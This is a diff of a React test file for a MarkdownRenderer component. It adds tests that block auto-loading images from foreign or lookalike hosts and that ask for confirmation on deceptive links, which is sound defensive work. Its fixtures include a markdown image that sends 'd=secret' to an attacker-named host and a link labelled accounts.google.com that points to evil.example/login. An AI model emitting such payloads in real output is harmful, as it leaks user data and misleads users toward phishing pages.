@@ -1,10 +1,18 @@
 import { fireEvent, render, screen, within } from "@testing-library/react";
-import { describe, expect, test, vi } from "vitest";
+import { afterEach, beforeEach, describe, expect, test, vi } from "vitest";
 import type { FormEvent } from "react";
 
 import { MarkdownRenderer } from "./MarkdownRenderer";
 
 describe("MarkdownRenderer", () => {
+  beforeEach(() => {
+    vi.stubEnv("VITE_CONVEX_URL", "https://example.convex.cloud");
+  });
+
+  afterEach(() => {
+    vi.unstubAllEnvs();
+  });
+
   test("renders highlighted source and copies its plain executable text", () => {
     const writeText = vi.fn().mockResolvedValue(undefined);
     Object.assign(navigator, { clipboard: { writeText } });
@@ -158,6 +166,44 @@ describe("MarkdownRenderer", () => {
     fireEvent.error(screen.getByRole("img", { name: "Example placeholder image" }));
 
     expect(screen.getByText("Failed to load image: Example placeholder image")).toBeInTheDocument();
+  });
+
+  test("does not auto-load images from other Convex deployments", () => {
+    render(
+      <MarkdownRenderer
+        content={[
+          "![Foreign](https://attacker-123.convex.site/download?filename=a.png&d=secret)",
+          "",
+          "![Lookalike](https://example.convex.site.evil.com/download?filename=a.png)",
+        ].join("\n")}
+      />,
+    );
+
+    expect(screen.queryByRole("img")).not.toBeInTheDocument();
+  });
+
+  test("asks for confirmation when link text names a different site", () => {
+    const open = vi.spyOn(window, "open").mockImplementation(() => null);
+    render(<MarkdownRenderer content={"[https://accounts.google.com](https://evil.example/login)"} />);
+
+    fireEvent.click(screen.getByRole("link", { name: "https://accounts.google.com" }));
+
+    expect(open).not.toHaveBeenCalled();
+    expect(screen.getByRole("dialog")).toHaveTextContent("evil.example");
+    fireEvent.click(screen.getByRole("button", { name: "Open link" }));
+    expect(open).toHaveBeenCalledWith("https://evil.example/login", "_blank", "noopener,noreferrer");
+    open.mockRestore();
+  });
+
+  test("opens matching and descriptive links without confirmation", () => {
+    render(<MarkdownRenderer content={"[example.com](https://www.example.com/a) and [read more](https://other.example)"} />);
+
+    for (const name of ["example.com", "read more"]) {
+      const link = screen.getByRole("link", { name });
+      const notPrevented = fireEvent.click(link);
+      expect(notPrevented).toBe(true);
+    }
+    expect(screen.queryByRole("dialog")).not.toBeInTheDocument();
   });
 
   test("does not render external markdown images", () => {
